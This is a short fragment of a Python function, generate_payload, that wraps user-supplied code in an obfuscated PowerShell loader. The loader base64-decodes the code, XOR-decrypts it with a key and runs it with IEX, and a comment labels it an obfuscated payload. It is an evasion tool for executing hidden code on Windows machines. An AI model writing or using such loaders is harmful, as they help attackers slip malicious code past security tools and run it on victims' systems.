...
def generate_payload(user_code, key=23):
    ...
    # Makarna kodu (obfuscated PowerShell payload)
    payload = f'''
${v_b64}={b64_split}; ${v_key}={key}; ${v_bytes}=[System.Convert]::FromBase64String(${v_b64}); ${v_dec}=for($i=0;$i -lt ${v_bytes}.Length;$i++){{${v_bytes}[$i]-bxor ${v_key}}}; ${v_out}=[System.Text.Encoding]::Unicode.GetString(${v_dec}); 1..1|ForEach-Object{{IEX ${v_out}}}
